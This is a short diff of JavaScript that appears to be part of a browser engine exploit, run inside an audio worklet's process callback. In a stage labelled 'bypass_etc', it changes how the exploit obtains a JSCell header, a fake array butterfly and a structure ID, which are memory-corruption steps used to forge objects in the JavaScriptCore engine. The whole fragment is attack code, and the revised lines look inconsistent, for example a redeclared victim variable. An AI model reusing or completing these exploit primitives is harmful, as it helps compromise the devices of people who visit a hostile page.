@@ -616,19 +616,16 @@ b.process = (inputs, outputs, parameters)=>{
     }
     else if(stage == "bypass_etc"){
         //fuck.port.postMessage(typeof parameters);
-        var gcPreventer = [];
-        for (let i = 0; i < 200; i++) {
-            let a = i == 0 ? parameters : victim;
-            gcPreventer.push(a[0]);
-        }
-        jscell_header = gcPreventer[0];
-        
-        var gcPreventer = [];
-        for (let i = 0; i < 200; i++) {
-            let a = i == 0 ? parameters : victim;
-            gcPreventer.push(a[1]);
-        }
-        evil_arr_butterfly = floatAsQword(gcPreventer[0]);
+        var structs = []
+     var i = 0;
+     var abc = [13.37];
+     abc.pointer = 1234;
+     abc['prop' + i] = 13.37;
+     structs.push(abc);
+     var victim = structs[0];
+        jscell_header = structs[0];
+
+        evil_arr_butterfly = floatAsQword(structs[0]);
         
         structure_id = floatAsQword(jscell_header) & 0xFFFFFFFF;
         if(structure_id == 0 ){
